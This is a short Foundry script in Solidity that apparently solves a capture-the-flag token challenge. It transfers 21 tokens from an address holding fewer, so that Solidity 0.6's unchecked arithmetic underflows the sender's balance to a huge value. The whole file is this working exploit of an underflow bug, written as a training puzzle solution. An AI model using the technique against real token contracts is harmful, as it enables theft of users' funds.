// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenReceiver {}

contract TokenSolution is Script {
    Token constant tokenInstance =
        Token(0x9403de4432875b6614822Ea4d579e163ED728f74);
    address myAddress = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        TokenReceiver tokenReceiver = new TokenReceiver();
        tokenInstance.transfer(address(tokenReceiver), 21);
        uint256 balance = tokenInstance.balanceOf(myAddress);
        vm.stopBroadcast();
    }
}
